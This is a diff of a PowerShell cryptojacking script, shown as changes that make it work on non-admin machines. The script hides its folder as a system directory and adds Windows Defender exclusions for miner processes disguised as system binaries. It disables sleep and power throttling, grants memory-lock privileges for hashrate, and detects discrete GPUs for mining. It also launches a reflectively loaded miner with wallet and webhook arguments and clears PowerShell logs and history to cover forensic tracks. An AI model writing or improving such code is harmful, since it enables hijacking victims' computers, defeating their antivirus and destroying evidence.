@@ -24,54 +24,58 @@ if (-not (Test-Path $StealthDir)) {
     (Get-Item $StealthDir).Attributes = 'Hidden','System','Directory'
 }
 
-# --- WINDOWS DEFENDER EXCLUSION (add our folder so AV doesn't eat binaries) ---
-try {
-    Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
-    # Also exclude the miner process names from real-time scanning
-    Add-MpPreference -ExclusionProcess "svchost_x.exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "RuntimeBroker_x.exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "SecurityHealthService_x.exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "SearchIndexer_x.exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "spoolsv_x.exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "ctfmon_x.exe" -ErrorAction SilentlyContinue
-} catch { }
+# --- CHECK ADMIN (skip admin-only optimizations on non-admin machines) ---
+$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# --- DISABLE SLEEP/HIBERNATE (keep machines mining longer) ---
-try {
-    powercfg /change standby-timeout-ac 0 2>$null
-    powercfg /change standby-timeout-dc 0 2>$null
-    powercfg /change hibernate-timeout-ac 0 2>$null
-    powercfg /change hibernate-timeout-dc 0 2>$null
-    powercfg /hibernate off 2>$null
-    powercfg /change monitor-timeout-ac 0 2>$null
-} catch { }
+if ($IsAdmin) {
+    # --- WINDOWS DEFENDER EXCLUSION ---
+    try {
+        Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "svchost_x.exe" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "RuntimeBroker_x.exe" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "SecurityHealthService_x.exe" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "SearchIndexer_x.exe" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "spoolsv_x.exe" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "ctfmon_x.exe" -ErrorAction SilentlyContinue
+    } catch { }
 
-# --- DISABLE POWER THROTTLING (full CPU speed for background processes) ---
-try {
-    $throttlePath = "HKLM:\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling"
-    if (-not (Test-Path $throttlePath)) { New-Item -Path $throttlePath -Force | Out-Null }
-    Set-ItemProperty -Path $throttlePath -Name "PowerThrottlingOff" -Value 1 -Type DWord -ErrorAction SilentlyContinue
-} catch { }
+    # --- DISABLE SLEEP/HIBERNATE ---
+    try {
+        powercfg /change standby-timeout-ac 0 2>$null
+        powercfg /change standby-timeout-dc 0 2>$null
+        powercfg /change hibernate-timeout-ac 0 2>$null
+        powercfg /change hibernate-timeout-dc 0 2>$null
+        powercfg /hibernate off 2>$null
+        powercfg /change monitor-timeout-ac 0 2>$null
+    } catch { }
 
-# --- ENABLE HUGE PAGES (20-30% hashrate boost for RandomX) ---
-try {
-    $tmpCfg = Join-Path $StealthDir "sp.cfg"
-    $tmpDb = Join-Path $StealthDir "sp.sdb"
-    secedit /export /cfg $tmpCfg /areas USER_RIGHTS 2>$null
-    $cfg = Get-Content $tmpCfg -Raw -ErrorAction SilentlyContinue
-    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
-    if ($cfg -and $cfg -notmatch $sid) {
-        if ($cfg -match "SeLockMemoryPrivilege") {
-            $cfg = $cfg -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid"
-        } else {
-            $cfg = $cfg + "`nSeLockMemoryPrivilege = *$sid`n"
+    # --- DISABLE POWER THROTTLING ---
+    try {
+        $throttlePath = "HKLM:\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling"
+        if (-not (Test-Path $throttlePath)) { New-Item -Path $throttlePath -Force | Out-Null }
+        Set-ItemProperty -Path $throttlePath -Name "PowerThrottlingOff" -Value 1 -Type DWord -ErrorAction SilentlyContinue
+    } catch { }
+
+    # --- ENABLE HUGE PAGES ---
+    try {
+        $tmpCfg = Join-Path $StealthDir "sp.cfg"
+        $tmpDb = Join-Path $StealthDir "sp.sdb"
+        secedit /export /cfg $tmpCfg /areas USER_RIGHTS 2>$null
+        $cfg = Get-Content $tmpCfg -Raw -ErrorAction SilentlyContinue
+        $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+        if ($cfg -and $cfg -notmatch $sid) {
+            if ($cfg -match "SeLockMemoryPrivilege") {
+                $cfg = $cfg -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid"
+            } else {
+                $cfg = $cfg + "`nSeLockMemoryPrivilege = *$sid`n"
+            }
+            Set-Content $tmpCfg $cfg
+            secedit /configure /db $tmpDb /cfg $tmpCfg /areas USER_RIGHTS 2>$null
         }
-        Set-Content $tmpCfg $cfg
-        secedit /configure /db $tmpDb /cfg $tmpCfg /areas USER_RIGHTS 2>$null
-    }
-    Remove-Item $tmpCfg -Force -ErrorAction SilentlyContinue
-    Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
-} catch { }
+        Remove-Item $tmpCfg -Force -ErrorAction SilentlyContinue
+        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
+    } catch { }
+}
 
 # --- PERSIST RANDOM NAME (use same name across reboots, don't pile up duplicates) ---
 $NameFile = Join-Path $StealthDir ".maskedname"
@@ -136,12 +140,22 @@ if (-not (Test-Path $MaskedCpu)) {
     }
 }
 
-# 2. Detect and Download GPU Miner
+# 2. Detect DISCRETE GPU only (skip integrated Radeon/Intel HD — they can't mine ETCHASH)
 $HasGpu = $null
+$IsAmd = "false"
 try {
     $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
     foreach ($vc in $vcs) {
-        if ($vc.Name -match "NVIDIA" -or $vc.Name -match "AMD" -or $vc.Name -match "Radeon") { $HasGpu = $true }
+        $name = $vc.Name
+        # NVIDIA discrete GPUs (GeForce, Quadro, Tesla)
+        if ($name -match "GeForce|Quadro|Tesla|RTX A") {
+            $HasGpu = $true; $IsAmd = "false"
+        }
+        # AMD discrete GPUs only (must have model: RX, R5, R7, R9, Pro, Vega, VII)
+        # "AMD Radeon Graphics" or "Radeon(TM) Graphics" = integrated APU = SKIP
+        if ($name -match "Radeon.*(RX|R[5-9]|Pro|Vega|VII)") {
+            $HasGpu = $true; $IsAmd = "true"
+        }
     }
 } catch { }
 
@@ -164,7 +178,6 @@ try {
     $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))
 
     $GpuArg = if ($HasGpu) { $MaskedGpu } else { "" }
-    $IsAmd = "true"
 
     $combinedArgs = "$MaskedCpu|$GpuArg|$Wallet|$IsAmd|$Webhook|$GithubUser|$RepoName"
     $startMethod.Invoke($null, @([string]$combinedArgs))
@@ -207,12 +220,12 @@ try {
     } catch { }
 }
 
-# --- POWERSHELL LOG CLEANUP (cover forensic tracks) ---
+# --- POWERSHELL LOG CLEANUP ---
 try {
-    # Clear PowerShell operational log
-    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-    # Clear Windows PowerShell log
-    wevtutil cl "Windows PowerShell" 2>$null
-    # Clear script block logging cache
+    if ($IsAdmin) {
+        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+        wevtutil cl "Windows PowerShell" 2>$null
+    }
+    # Console history cleanup works without admin
     Remove-Item "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
 } catch { }
